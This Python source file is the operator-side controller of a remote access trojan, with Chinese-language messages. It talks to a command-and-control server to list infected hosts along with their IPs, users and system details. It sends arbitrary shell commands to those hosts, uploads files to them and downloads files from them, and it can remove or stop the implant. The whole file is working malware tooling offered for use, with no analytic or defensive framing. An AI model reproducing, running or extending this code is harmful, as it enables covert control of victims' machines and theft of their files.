from time import sleep
from requests import get, post
from base64 import b64decode, b64encode
from json import dumps, loads
from threading import Thread
from os import system, name
from os.path import basename,getsize,exists
from settings import *
from lib.crypt_hangzi import *
import socket
import sys

class BaseFunc:
    def __init__(self) -> None:
        self.send_url = "http://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/addtask"
        self.get_rst = "http://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/getrst"
        self.get_host = "http://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/getlive"
        self.del_url = "http://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/killhost"
        self.file_url = "http://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/clientupload"
        self.pwd = CryptHangZi().encrypt_pwd(PASSWORD)
        self.host_keys = dict()

    def sendcmd(self,key:str,cmd:str,time:str=""):
        if isinstance(cmd,str) and isinstance(time,str):
            data = {"pwd":self.pwd,"key":key,"cmd":b64encode(dumps({"sleeptime":time,"cdm":cmd}).encode("utf-8"))}
            rst = post(url=self.send_url,data=data,timeout=5)
            if rst.status_code == 200:
                rst = loads(rst.text)
                print(rst.get("info"))
            else:
                print("连接异常！")
        else:
            print("参数类型错误！")

    def getrst(self):
        rst = post(url=self.get_rst,data={"pwd":self.pwd},timeout=5)
        if rst.status_code == 200:
            print(loads(rst))
    
    def get_online_host(self):
        rst = post(url=self.get_host,data={"pwd":self.pwd},timeout=5)
        if rst.status_code == 200:
            data = loads(rst.text)
            if data.get("data").get("info"):
                print("获取信息失败！")
            else:
                print("\n\n                                 当前存活主机信息！                                         ")
                for i,j in data.get("data").items():
                    info = j['data']
                    self.host_keys[i] = j['key']
                    print("\n| ID标记：{} |-| 本地IP：{} |-|外网IP：{} |-| 用户：{} |-| 系统信息：{} |".format(i,info.get('local_ip'),info.get('remote_ip'),\
                        info.get("localuser"),info.get("sys_info")))
                    print("\n")
        else:
            print("获取信息失败！")
    
    def del_host(self,host:str):
        if isinstance(host,str) and host != "":
            data = {"pwd":self.pwd,"key":self.host_keys.get(host)}
            r = post(url=self.del_url,data=data,timeout=5)
            if r.status_code == 200:
                if loads(r.text).get("info") == "删除成功":
                    print("删除成功！")
                    sleep(1)
                    if name == "nt":
                        system("cls")
                    else:
                        system("clear")
                    self.get_online_host()
                else:
                    print(loads(r.text).get("info"))
            else:
                print("服务器连接异常！")

    def help_info(self):
        print("""
        查看当前上线主机

            getlive

        对上线主机进行操作

            set 主机ID 操作[shell,time,uploadfile,downfile,del] 参数

            例：
              set 主机ID shell 你要执行的系统命令
              set 主机ID time 你要设定的时间(如果时间小于零则默认设置为10)
              set 主机ID uploadfile 要上传的文件路径 目标路径
              set 主机ID downfile 目标文件路径
              set 主机ID del(删除主机)
              set 主机ID shell exit_yes(执行此命令木马会停止运行)

        查看帮助
            help

        要退出请按两次 ctrl + c

        """)

    def uploadfile(self,host_key:str,filepath:str,targetfilepath:str):
        if exists(filepath):
            pass
        else:
            print("文件不存在！")
            return ''
        if targetfilepath.strip()[-1] == "/":
            pass
        else:
            targetfilepath = targetfilepath+"/"
        self.sendcmd(host_key,"uploadfile")
        print("发布任务！\n正在等待木马端连接...")
        s = socket.socket()
        s.connect((LOCAL_IP,60000))
        s.send("c".encode("utf-8"))
        switch = True
        filename = basename(filepath)
        filesize = getsize(filepath)
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8"))
                break
        if isinstance(isok,dict) and isok.get("info") == "yes":
            print("对接成功！正在上传文件...")
            while switch:
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                if data.get("data") == "exit":
                    s.send(dumps(data).encode("utf-8"))
                    break
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                data = {"whoami":"c","data":"senddata"}
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content)
                        s.sendall(content)
                        if filesize == 0:
                            switch = False
                            break
        while True:
            data = s.recv(1024)
            if data:
                data = data.decode("utf-8")
                if data == "exit":
                    print("文件上传成功！")
                    break
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        s.close()


    def downfile(self,host_key:str,filepath):
        print("正在下载文件：{} ...".format(filepath))
        self.sendcmd(host_key,filepath)
        print("发布任务！\n正在等待木马端连接...")
        s = socket.socket()
        s.connect((LOCAL_IP,60000))
        s.send("t".encode("utf-8"))
        filename = ''
        filesize = ''
        filewritedir = ''
        data = s.recv(1024)
        if data:
            try:
                data = data.decode("utf-8")
            except:
                pass
            else:
                print("木马连接成功!!!")
                data = data.split("'")[1]
                data = loads(b64decode(data).decode("utf-8"))
                filename = data.get("filename")
                filesize = data.get("filesize")
                if filename == "nofile" and filesize == -1:
                    s.send(dumps({"whoami":"exit"}).encode("utf-8"))
                    s.close() 
                    print('文件不存在！')
                    return ''
                filewritedir = "./downfile/"#data.get("filewritedir")
                with open(filewritedir+filename,"wb") as fp:
                    print("正在下载...")
                    if isinstance(data,str):
                        data = data.encode("utf-8")
                        filesize -= len(data)
                        fp.write(data)
                    while filesize >0:
                        data = s.recv(1024)
                        if data:
                            filesize -= len(data)
                            fp.write(data)
                            if filesize == 0:
                                fp.flush()
                                s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8"))
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        print("下载完成！！！")
        s.close() 

    def opt_deal(self,opt:str):
        opt_ = opt.strip().split(' ')
        if opt_[0].strip() == "set":
            if opt_[2].strip() == "shell":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()),opt.split("shell")[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "time":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()),cmd="whoami",time=opt.split("time")[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "del":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.del_host(opt_[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "uploadfile":
                file = opt.split("uploadfile")[1].split(" ")
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if file[1].strip and file[2].strip():
                            self.uploadfile(self.host_keys.get(opt_[1].strip()),file[1].strip(),file[2].strip())
                        else:
                            print("参数错误！")
                    except IndexError:
                        print("参数错误！")
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "downfile":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if opt_[1].strip() and opt_[2].strip() and opt_[3].strip():
                            self.downfile(self.host_keys.get(opt_[1].strip()),opt_[2].strip()+" "+opt_[3].strip())
                        else:
                            print("参数错误！")
                    except IndexError:
                        print("参数错误！")
                else:
                    print("主机不存在！")
            else:
                print("操作不支持！")
        elif opt_[0].strip() == "getlive":
            if name == "nt":
                system("cls")
            else:
                system("clear")
            self.get_online_host()

        elif opt_[0].strip() == "help":
            self.help_info()
       
        else:
            print("操作不支持！")